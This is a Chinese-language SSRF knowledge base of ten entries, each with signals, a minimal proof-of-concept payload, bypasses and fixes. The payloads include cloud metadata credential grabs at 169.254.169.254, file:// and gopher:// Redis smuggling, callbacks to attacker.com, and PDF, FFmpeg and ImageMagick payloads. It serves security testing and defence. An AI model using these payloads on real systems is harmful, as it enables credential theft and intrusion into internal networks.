# SSRF & URL Manipulation Techniques

> 来源：PortSwigger Web Security Academy / OWASP / HackTricks / PayloadsAllTheThings / CWE-918

---

### [KB-SSRF-001] Basic SSRF to Internal Services
- **类别**: SSRF
- **信号**: 应用接受 URL 参数后向内部地址发起 HTTP 请求；响应内容回显在页面中（反射型）或通过侧信道（时间延迟、错误消息）泄露
- **原理**: 服务端未校验目标地址，将用户可控 URL 作为请求目标，可访问仅内网可达的服务
- **最小PoC**:
  ```
  # 目标参数接受 URL 并抓取内容
  POST /api/fetch HTTP/1.1
  Host: target.com
  Content-Type: application/x-www-form-urlencoded

  url=http://127.0.0.1:8080/admin
  ```
- **绕过与变体**: 端口扫描（通过响应时间/状态差异枚举内网开放端口）；短路径遍历（`http://localhost/admin`、`http://0.0.0.0/`）
- **修复**: 严格 URL 白名单；禁止内网/回环地址解析（RFC 1918、127.0.0.0/8）；网络层出站过滤
- **参考**: CWE-918; PortSwigger: Server-side request forgery (SSRF)

---

### [KB-SSRF-002] SSRF to Cloud Metadata (AWS IMDSv1)
- **类别**: SSRF
- **信号**: 目标部署在云环境（AWS/EC2、GCP、Azure）；向 `169.254.169.254` 发起请求时返回实例元数据（含 IAM 临时凭证、用户数据）
- **原理**: IMDSv1 无认证头要求，任何能从实例发起 HTTP 请求的进程即可读取元数据；若应用存在 SSRF 且未限制链路本地地址，即可窃取凭证
- **最小PoC**:
  ```
  # AWS IMDSv1 — 无需任何认证头
  GET /latest/meta-data/iam/security-credentials/<role-name> HTTP/1.1
  Host: 169.254.169.254
  ```
  经由 SSRF 参数注入：
  ```
  url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
  ```
- **绕过与变体**: IMDSv2 需要 `X-aws-ec2-metadata-token` 头（PUT 获取 token 后携带），部分 SSRF 不支持自定义头则无法利用；GCP `metadata.google.internal`；Azure `169.254.169.254/metadata/instance` 需 `Metadata: true` 头
- **修复**: 升级至 IMDSv2（强制 token）；网络层阻止实例对 169.254.169.254 的非必要访问（iptables）；应用层禁止链路本地地址
- **参考**: CWE-918; HackTricks: AWS SSRF; OWASP: Server Side Request Forgery

---

### [KB-SSRF-003] SSRF with URL Scheme Bypass (file://, gopher://)
- **类别**: SSRF
- **信号**: URL 白名单仅校验域名/IP，未限制 scheme；目标使用支持多协议的 HTTP 客户端（cURL、PHP `file_get_contents`、Java `URLConnection`）
- **原理**: 应用仅过滤了目标主机但放行任意 URI scheme，攻击者使用 `file://` 读取本地文件、`gopher://` 向任意 TCP 端口发送原始 payload（伪造 Redis/SMTP/FastCGI 请求）
- **最小PoC**:
  ```
  # file:// 读取 /etc/passwd
  url=file:///etc/passwd

  # gopher:// 伪造 Redis 命令写 SSH key
  # (需对 payload 做 URL 编码)
  url=gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall...
  ```
- **绕过与变体**: `dict://` 协议探测端口与服务；`netdoc://`（Java）；SSRF via `jar://`/`php://`/`expect://`；CRLF 注入伪造 HTTP 请求
- **修复**: 仅允许 `http://` 和 `https://` scheme；使用 scheme 白名单；禁用危险协议处理器
- **参考**: CWE-918; PayloadsAllTheThings: SSRF URL Schemes; HackTricks: Gopher SSRF

---

### [KB-SSRF-004] SSRF with DNS Rebinding
- **类别**: SSRF
- **信号**: 应用做了一次性 DNS 解析校验但后续连接与校验之间存在时间窗口；攻击者控制的 DNS 返回极短 TTL
- **原理**: 攻击者配置域名解析：首次解析返回合法公网 IP（通过校验），TTL=0 使结果立即过期；应用发起连接时再次解析，此次返回内网 IP（127.0.0.1 / 169.254.169.254），绕过校验
- **最小PoC**: 注册 `rebind-1.attacker.com`，配置 DNS 交替返回 `1.2.3.4`（校验通过）→ `127.0.0.1`（实际连接目标）
  ```
  url=http://rebind-1.attacker.com:8080/admin
  ```
- **绕过与变体**: TOCTOU（Time-of-Check-Time-of-Use）在单次校验后使用 IP 而非域名即可缓解；PIN 码保护的 DNS rebinding（Rust/Go 默认 DNS 缓存）；利用 Singularity 等工具框架
- **修复**: DNS 解析后使用获得的 IP 地址与 DNS 结果锁死（不二次解析）；禁用 DNS 缓存绕过（固定最小 TTL）；出口防火墙拒绝内网 IP
- **参考**: CWE-350; HackTricks: DNS Rebinding; OWASP WSTG-SESS-01

---

### [KB-SSRF-005] Blind SSRF with Callback (Out-of-Band)
- **类别**: SSRF
- **信号**: SSRF 触发但响应不回显（"盲"SSRF）；可通过 DNS/HTTP 外连回调确认利用
- **原理**: 即使 SSRF 没有响应回显，仍可让目标向攻击者控制的服务器发起 DNS 查询或 HTTP 请求，通过回调日志确认漏洞存在；进而使用 `gopher://` 等协议进行利用
- **最小PoC**:
  ```
  # 注入 Collaborator / Burp 或自建 DNS 域名
  url=http://abc123.burpcollaborator.net

  # 自建监听确认回连
  # $ nc -lvnp 8080
  url=http://attacker.com:8080/callback
  ```
- **绕过与变体**: DNS 外连（`nslookup attacker.com`）、HTTP 外连、SNI 外连；Referer 头注入触发 callback；XXE 联动 Blind SSRF
- **修复**: 出站网络隔离（不允许应用服务器向公网发起连接）；应用层禁止用户可控 URL 指向公网；DNS 出口白名单
- **参考**: CWE-918; PortSwigger: Blind SSRF vulnerabilities; OWASP: Blind SSRF

---

### [KB-SSRF-006] SSRF via PDF Generator
- **类别**: SSRF
- **信号**: 应用提供 HTML→PDF 转换功能（使用 wkhtmltopdf、PrinceXML、Puppeteer、Headless Chrome）；PDF 中包含远程资源或 SSRF 触发的内网内容
- **原理**: PDF 渲染引擎解析 HTML 中的 `<img>`、`<iframe>`、`<link>`、`<script>` 等标签时会发起 HTTP 请求获取外部资源；若未限制渲染器网络访问，可读取内网页面并嵌入 PDF
- **最小PoC**:
  ```
  <!-- 提交以下 HTML 让 PDF 生成器渲染 -->
  <html>
    <body>
      <img src="http://169.254.169.254/latest/meta-data/">
      <iframe src="http://127.0.0.1:8080/admin"></iframe>
      <link rel="stylesheet" href="http://internal.corp/secret.css">
    </body>
  </html>
  ```
- **绕过与变体**: 利用 `file:///etc/passwd` 在 `<iframe>` 中本地文件读取；通过 `--javascript-delay` 等参数执行 JS 发请求；CSS `@import url()` 外连
- **修复**: 禁用 PDF 渲染器网络访问（`--disable-external-links`、`--no-network`）；沙箱化渲染进程；渲染前置 URL 白名单校验
- **参考**: CWE-918; HackTricks: PDF Generator SSRF; PortSwigger: SSRF via HTML-to-PDF

---

### [KB-SSRF-007] SSRF via FFmpeg / ImageMagick
- **类别**: SSRF
- **信号**: 应用使用 FFmpeg 或 ImageMagick 处理用户上传的媒体文件；视频/图片处理后侧信道泄露内网信息
- **原理**: FFmpeg 支持多种输入协议（`http`、`concat`、`hls`），可通过精心构造的视频文件（HLS playlist / M3U8）让 FFmpeg 请求内网 URL；ImageMagick 的 MSL/HTTPS/SVG 委托可触发 SSRF
- **最小PoC**:
  ```
  # FFmpeg: 构造 M3U8 文件包含内网 URL
  #EXTM3U
  #EXTINF:10,
  http://169.254.169.254/latest/meta-data/

  # ImageMagick: 利用 MSL 策略文件
  <!-- uploaded as image.msl -->
  <image>
    <read filename="http://127.0.0.1:8080/secret" />
    <write filename="output.png" />
  </image>
  ```
- **绕过与变体**: FFmpeg `concat` 协议；`crypto+http`；HLS AES-128 key URI 指向内网；ImageMagick `text:` 编码器读取本地文件（CVE-2016-3714 ImageTragick）；`label:@/etc/passwd`
- **修复**: 禁用 FFmpeg 网络协议（`-protocol_whitelist file`）；升级 ImageMagick 并配置 `policy.xml` 限制危险编码器与协议；沙箱执行媒体处理
- **参考**: CVE-2016-3714; CWE-918; HackTricks: FFmpeg SSRF; OWASP: File Upload + SSRF

---

### [KB-SSRF-008] Open Redirect Chained to SSRF
- **类别**: SSRF
- **信号**: 应用存在开放重定向且 SSRF 过滤仅检查域名是否为已知可信域名（白名单校验）
- **原理**: SSRF 过滤可能仅允许对特定可信域名的请求；若该可信域名存在开放重定向，攻击者可利用重定向将请求转发至内网 IP，从而绕过 SSRF 防护
- **最小PoC**:
  ```
  # 假设 API 白名单仅允许 api.trusted.com
  # 但 api.trusted.com/redirect?url=... 存在开放重定向

  POST /api/fetch HTTP/1.1
  Host: target.com

  url=https://api.trusted.com/redirect?url=http://169.254.169.254/latest/meta-data/
  ```
- **绕过与变体**: 路径穿越 + 重定向（`https://trusted.com/..%2f@evil.com`）；CRLF 注入伪造 Location 头；短链接服务链式跳转；利用 OAuth 回调 URL 重定向
- **修复**: 消除所有开放重定向（非必需的 redirect 端点一律移除，必须存在则使用白名单目标）；SSRF 过滤时禁止 HTTP 重定向跟随（或限制跳转次数 + 逐跳校验目标地址）
- **参考**: CWE-601 + CWE-918; PortSwigger: SSRF with whitelist bypass via open redirect; HackTricks: Open Redirect to SSRF

---

### [KB-SSRF-009] SSRF in GraphQL
- **类别**: SSRF
- **信号**: GraphQL endpoint 中存在接受 URL 的字段（如 `avatarUrl`、`importUrl`、`webhookUrl`）；mutation 或 query 触发服务端 HTTP 请求
- **原理**: GraphQL schema 中某些字段为 URL 类型，服务端 resolver 解析该字段时会发起 HTTP 请求获取远程资源（如图片导入、webhook 验证）；若未做目标地址校验，可指向内网
- **最小PoC**:
  ```graphql
  # 假设存在 importFromUrl mutation
  mutation {
    importFromUrl(url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/") {
      id
      content
    }
  }

  # 或通过 query 探测
  query {
    user(id: 1) {
      avatarUrl  # 若可通过 mutation 设置为内网 URL
    }
  }
  ```
- **绕过与变体**: 内省查询（`__schema`）泄露 URL 输入字段；批量查询（aliases）并发探测多个内网端口；subscription 触发持续外连；GraphQL batching 绕过速率限制
- **修复**: GraphQL resolver 内校验 URL 目标地址（禁止内网/回环）；查询深度与复杂度限制；内省禁用（生产环境）
- **参考**: CWE-918; HackTricks: GraphQL Attacks; PortSwigger: GraphQL API vulnerabilities

---

### [KB-SSRF-010] SSRF Filter Bypass (IPv6, Decimal IP, DNS)
- **类别**: SSRF
- **信号**: 应用实现了 SSRF 黑名单过滤（正则/字符串匹配），但覆盖不全；可通过多种 IP 表示方式绕过
- **原理**: IPv4 地址有多种等效表示法（十进制整数、八进制、十六进制、混合格式）；IPv6 同样可被压缩或以不同格式表示；DNS 解析可指向内网。黑名单过滤难以穷举所有等效形式
- **最小PoC**:
  ```
  # IPv4 十进制整数表示（127.0.0.1 = 2130706433）
  url=http://2130706433:8080/admin

  # IPv6 回环地址
  url=http://[::1]:8080/admin
  url=http://[::ffff:127.0.0.1]:8080/admin

  # 八进制表示
  url=http://0177.0.0.1:8080/admin

  # DNS 解析指向内网（xip.io / nip.io）
  url=http://127.0.0.1.xip.io:8080/admin

  # URL 短域名 / 重定向服务指向内网
  ```

  IP 转换速查：
  | 格式 | 127.0.0.1 等价表示 |
  |------|-------------------|
  | 十进制整数 | `2130706433` |
  | 十六进制 | `0x7f000001` |
  | 八进制 | `0177.0.0.1` |
  | IPv6 映射 | `[::ffff:127.0.0.1]` |
  | DNS 通配 | `127.0.0.1.nip.io` |
- **绕过与变体**: URL 编码混淆（`%31%32%37%2e%30%2e%30%2e%31`）；双 URL 编码；Unicode 归一化差异；`localhost` 字符串替代 `127.0.0.1`；`0.0.0.0`；`[0:0:0:0:0:ffff:127.0.0.1]`；利用 302 重定向绕过；DNS CNAME 记录指向内网
- **修复**: 使用白名单而非黑名单；在网络层做出口过滤（引入正向代理强制执行）；DNS 解析后进行 IP 范围校验（将域名解析为 IP 后判定）；使用 `curl` 的 `CURLOPT_PROTOCOLS` 限制协议
- **参考**: CWE-918; OWASP: SSRF Bypass Techniques; PayloadsAllTheThings: SSRF Bypass; HackTricks: SSRF Bypass

---

## 快速索引

| 编号 | 技术 | 攻击面 |
|------|------|--------|
| KB-SSRF-001 | Basic SSRF | URL 输入参数 → 内网服务 |
| KB-SSRF-002 | Cloud Metadata | 169.254.169.254 → IAM 凭证窃取 |
| KB-SSRF-003 | Scheme Bypass | file:///gopher:// → 本地读取/协议走私 |
| KB-SSRF-004 | DNS Rebinding | DNS TTL=0 → TOCTOU 绕过 |
| KB-SSRF-005 | Blind SSRF | 无回显 → OOB callback 确认 |
| KB-SSRF-006 | PDF Generator | HTML→PDF 渲染引擎 → 内网请求 |
| KB-SSRF-007 | FFmpeg/ImageMagick | 媒体处理 → 协议利用 |
| KB-SSRF-008 | Open Redirect Chain | 白名单域名 + 重定向 → SSRF |
| KB-SSRF-009 | GraphQL SSRF | Resolver URL 字段 → 内网请求 |
| KB-SSRF-010 | Filter Bypass | IPv6/十进制 IP/DNS → 黑名单绕过 |
